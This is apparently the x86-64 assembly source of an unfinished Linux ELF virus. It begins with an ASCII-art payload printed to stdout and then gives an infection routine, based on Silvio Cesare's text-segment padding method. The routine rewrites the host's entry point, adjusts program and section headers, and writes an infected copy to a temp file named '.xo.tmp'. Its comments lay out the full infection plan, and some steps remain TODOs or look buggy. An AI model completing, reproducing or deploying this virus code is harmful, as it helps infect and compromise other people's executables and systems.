		db 0x59,0x24,0x24,0x24,0x24,0x59,0x2c,0x2e,0x2c,0x24,0x59,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2e,0x2e,0x2e,0x2c,0x2e,0x2c,0x24,0x59,0x50,0x2b,0x59,0x50,0x50,0x50,0x2b,0x50,0x2b
		db 0x59,0x24,0x59,0x2b,0x2a,0x50,0x50,0x59,0x2c,0x2e,0x2c,0x2c,0x24,0x2b,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x2c,0x2a,0x2a,0x2a,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59
		db 0x2a,0x2a,0x2a,0x50,0x59,0x59,0x59,0x24,0x24,0x24,0x2c,0x2e,0x2c,0x2c,0x24,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2e,0x2c,0x2b,0x50,0x2a,0x4a,0x44,0x25,0x2a,0x2a,0x50,0x50,0x2b,0x50,0x50,0x24,0x2c,0x24,0x24,0x2c,0x2c
		db 0x24,0x2b,0x2b,0x2b,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x59,0x2c,0x2e,0x2e,0x2e,0x2e,0x24,0x2b,0x2b,0x2a,0x2a,0x2a,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x59,0x2c,0x24,0x24,0x59,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2e,0x2e,0x2e,0x2c,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x24,0x2e,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x2b,0x2a,0x50,0x2b,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x24,0x2c,0x24,0x59,0x24,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x59,0x59,0x24,0x2c,0x2c,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x2b,0x50,0x50,0x50,0x50,0x2b,0x2a,0x50,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x24,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2e,0x2e,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x50,0x2b,0x2b,0x50,0x50,0x2b,0x24,0x24,0x24,0x59,0x2b,0x24,0x2c,0x24,0x59,0x2c,0x2c,0x59,0x24,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x24,0x2b,0x2c,0x2e,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x50,0x50,0x2b,0x2a,0x25,0x2b,0x24,0x24,0x24,0x2b,0x2b,0x2c,0x2c
		db 0x59,0x59,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2e,0x2c,0x24,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x50,0x2c,0x2c,0x2b,0x2c,0x2e,0x50,0x2b,0x2c,0x24,0x2a,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x24
		db 0x2c,0x59,0x50,0x24,0x24,0x59,0x59,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x50,0x50,0x59,0x24,0x24,0x2c,0x2c,0x2b,0x59,0x24,0x50,0x2a,0x59,0x59,0x25,0x25,0x2a,0x2a,0x2a,0x25,0x25
		db 0x2b,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x24,0x2a,0x2a,0x50,0x50,0x2a,0x25,0x25,0x25,0x44,0x44,0x25,0x44,0x44,0x25,0x25,0x2a,0x44,0x2a,0x2b,0x59,0x59
		db 0x2b,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x2b,0x59,0x2b,0x59,0x50,0x50,0x24,0x2a,0x2b,0x24,0x25,0x2a,0x2c,0x2c,0x24,0x44,0x2a,0x24,0x2c
		db 0x24,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x50,0x2a,0x2b,0x59,0x2b,0x2b,0x25,0x2b,0x25,0x25,0x2b,0x2a,0x25,0x50,0x2b,0x50,0x2a,0x2b,0x59
		db 0x2b,0x2b,0x2b,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2b,0x50,0x2a,0x50,0x50,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x2b,0xa,0x59,0x59,0x59,0x2b,0x2a,0x2a,0x2a,0x2a,0x2a,0x50,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x59,0x2b,0x2b,0x2a,0x25,0x2a,0x2a,0x50,0x2b,0x2b,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
	payload_len equ $-painting
	
payload:
	pop rsi
	mov rdx, payload_len
	mov rax, SYS_WRITE
	mov rdi, STDOUT
	syscall
	
	jmp _restore

;jmp frankenstein_elf		
;****************************************************************************************
;	Infection routine:
;
;	assumes the following:
; 	vlen == length of virus code
;	PAGESIZE == 4096	
;
;	1. identify entry point of host program and patch virus code to jump back to original
;	host entry point
;	2. 	a. copy ELF header from host program to virus;
;		b. change e_shoff in virus ELF header to new e_shoff s.t. 
;			new_vx_e_shoff = host_e_shoff + PAGESIZE
;	3. 	a. Loop through all Phdrs to find the text segment Phdr
;		b. if curr_Phdr == text_segment_Phdr then, do the following:
;			i. modify entry point of ELF header to point to the virus code
;			ii. increase p_filesz by vlen [p_filesz += vlen] 
;			iii. increase p_memsz by vlen, [p_memsz += vlen]
;		c. Else, for all Phdrs corresponding to segments located after the inserted virus code (aka for each Phdr of a segment after the text segment), then, do the following:
;			i. increase p_offset by PAGESIZE
;	4. Loop through all Shdrs
;		a. If curr_shdr == last_shdr_text_segment then,
;			i. increase sh_len by vlen [sh_len += vlen]
;		b. Else, for all Shdrs corresponding to sections located after the inserted virus code (aka for each Shdr of a section after virus code), then, do the following:
;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
;	5. Insert the virus code into the host program (or, in our case, into the tempfile we are constructing to replace host program)
;
;****************************************************************************************

infect:
	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
	;mov qword [hostentry_offset], r13	;move r13 to saved var hostentry_offset, 
									;to be used for calculating offsets w writes to temp file
	mov rdx, checkphdrstartlen
	lea rsi, checkphdrstart
	mov rdi, STDOUT
	mov rax, SYS_WRITE
	syscall

	
;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
;;	mov qword [vxhostentry], r11

;****************************************************************************************
;	Update program headers of infected ELF
;
;	e_phentsize == size of program header entry	
;	size of program header table == e_phnum * e_phentsize
;
;	vx_offset = the offset to start of vx code after insertion into host program 
;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
;	r13 contains address of mmap'ed file
;	r12 contains *offset* within mmap'ed file to PHdr
;	we need to increment r12 on each iteration (where # of iterations == elf_ehdr.e_phnum)
;
;****************************************************************************************
	xor rcx, rcx
	mov word cx, [r13 + elf_ehdr.e_phnum]
	check_phdrs:
		;push rdx
		.phdr_loop:
			;cmp rcx, 0
			;jg .mod_subsequent_phdr		
			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
			jne .mod_subsequent_phdr
			.mod_curr_header:
				mov rdx, checkptloadpasslen
				lea rsi, checkptloadpass
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
				add r10, [r13 + r12 + elf_phdr.p_filesz]
				mov qword [evaddr], r10				;save evaddr
				add qword r10, [ventry]				;new entry point of infected file = evaddr + ventry
				mov [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
				mov r10, [r13 + r12 + elf_phdr.p_offset] 
				mov dword [hosttext_start], r10d
				add r10, [r13 + r12 + elf_phdr.p_filesz]				
				mov qword [vxoffset], r10
				add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
				add qword [r13 + r12 + elf_phdr.p_memsz], vlen	

			.mod_subsequent_phdr:
				mov rdx, checkptloadfaillen
				lea rsi, checkptloadfail
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
				add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
		.next_phdr:
			dec cx 
			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
			;add [hostentry_offset], word [r13 + elf_hdr.phentsize]
			cmp cx, 0
			jg .phdr_loop
			;jg check_shdrs
	;add qword [hostentry_offset], r12
	mov dword [hostentry_offset], r12d
	jmp frankenstein_elf
	;jg check_shdrs
;****************************************************************************************
;	Now update section headers of infected ELF
;****************************************************************************************

	xor rdx, rdx
	mov dx, word [r13 + elf_ehdr.e_shentsize]
	xor r11, r11
	xor rcx, rcx
	check_shdrs:
		push rcx
		.shdr_loop:
			cmp qword [r13 + r15 + elf_shdr.sh_offset], vxoffset
			jge .mod_subsequent_shdr
			mov r11, [r13 + r15 + elf_shdr.sh_addr]
			add r11, [r13 + r15 + elf_shdr.sh_size]
			cmp r10, r11
			jne .mod_subsequent_shdr
			add qword [r13 + r15 + elf_shdr.sh_size], vlen


			.mod_subsequent_shdr:
				add qword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
		;.next_shdr:
		pop rcx
		inc rcx 
		add r15, rdx 
		cmp rcx, [r13 + elf_ehdr.e_shnum]
		jl .shdr_loop

	mov r11, qword [r13 + elf_ehdr.e_shoff]
	mov qword [oshoff], r11
	cmp qword r11, [vxoffset]
	;jg .patch_ehdr_shoff
	jl frankenstein_elf
	jmp fin_infect
	
	

;****************************************************************************************
;	From silvio's article [1], we know that an infected ELF will have 
;	the following layout:
;
;	ELF Header
;	Program Header Table
;	Segment 1
;		text
;		parasite
;
;	Segment 2
;	Section Header Table
;	Section 1
;	...
;	Section n
;
;	So this is the order in which we will construct (write to) our new complete
;	infected ELF -- currently a temp file, to be renamed to that of the host
;
;
;	Our plan for building this file will be to do the following:
;	create new temp file ".xo.tmp"
;	lseek to position 0 in .xo.tmp
;	write modified elf header to .xo.tmp
;	write modified program header to .xo.tmp
;	lseek to host text segment in host ELF 
;	copy (write) host text segment from host ELF to .xo.tmp
;	write virus body to .xo.tmp
;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
;	write any padding bytes needed to maintain page alignment for temp file
;	write modified section header table to .xo.tmp
;	lseek to end of section header table in host ELF
;	copy (write) remaining bytes (end of shdr table to EOF) from host ELF to .xo.tmp
;	
;	TODO: add routine for renaming .xo.tmp to original host file name
;	TODO: add routine for changing permissions/owner of infected ELF to match 
;			those of the original host file
;	close temp file
;	unmap file from memory
;
;****************************************************************************************

frankenstein_elf:
	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
	mov [r14 + 0x800], rax
	lea rdi, [r14 + 0x800]			;name of file in rdi
	mov rsi, 0777o					;mode - 755 (file perms for new file)
									;(O_CREAT | O_TRUNC | O_WRONLY)
	mov rax, SYS_CREAT
	syscall
	
	mov r9, rax
	mov rdi, rax

	;write ELF header to temp file
	;actually just write the first 1024 bytes of target ELF to temp file

	cmp dword [hostentry_offset], PAGESIZE
	jl .adjust_offset_ehdr_phdr_copy
	jmp .offset_ehdr_phdr_copy_pagesize
	.adjust_offset_ehdr_phdr_copy:
		;mov rdx, textsegmentoffset_pageno_len
		;lea rsi, textsegmentoffset_pageno
		;mov rdi, STDOUT
		;mov rax, SYS_WRITE
		;syscall

		;xor rdx, rdx	
		;mov rdx, [hostentry_offset]
		mov rdx, [hosttext_start]
		jmp .write_ehdr_phdrs
	.offset_ehdr_phdr_copy_pagesize:
		;mov rdx, textsegmentoffset_pageyes_len
		;lea rsi, textsegmentoffset_pageyes
		;mov rdi, STDOUT
		;mov rax, SYS_WRITE
		;syscall
		
		;xor rdx, rdx	
		mov rdx, [PAGESIZE]
	.write_ehdr_phdrs:	
		;mov rdx, 512
		;mov rdx, 64
		;mov rdx, 1024
		mov rsi, r13					;r13 contains pointer to mmap'd file
		mov rax, SYS_WRITE
		syscall

	;.lseek_end_phdrs:
		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
		;mov rsi, rdx					;(offset in rsi =hostentryoffset)
		;mov rdx, SEEK_CUR				;fd set to current position + offset 
		;mov rax, SYS_LSEEK
		;syscall

	.write_padding_until_textsegment:		
		;mov rdx, evaddr
		;sub rdx, [hostentry_offset]
		add rdx, hosttext_start
		;;mov rdx, [hosttext_start]
		;sub rdx, hostentry_offset
		;add edx, dword [PAGESIZE - dx]
		;add rdx, [hostentry_page_offset]
		;mov rdx, rcx

		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
		mov rsi, r13
		mov r10, [hostentry_offset]
		mov rax, SYS_PWRITE64
		syscall


	;.lseek_textsegment:
	

	;.write_hosttextsegment:
		;;mov rcx, [evaddr]
		;;sub rcx, [hostentry_offset]
		;;mov rdx, rcx
	;	mov rdx, [PAGESIZE]
	;	mov rsi, [r13 + hostentry_offset]					;r13 contains pointer to mmap'd file
	;	mov rsi, r13
	;	add rsi, hostentry_offset
	;	mov rax, SYS_WRITE
	;	syscall
		
		;munmap file from work area
		;mov qword rsi, [elf_filesize]
	;	mov rdi, r13
	;	mov rsi, [r14 + filestat.st_size]
	;	mov rax, SYS_MUNMAP
	;	syscall

	;close temp file
	.close_temp:
		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall


fin_infect:
	ret


;;restore stack to original state
_restore:
	add rsp, 0x1000
	mov rsp, rbp
	pop rbp
	
;exit
_end:
	xor rdi, rdi
	mov rax, 0x3c ;exit() syscall on x64
	syscall	

vlen equ $-_start


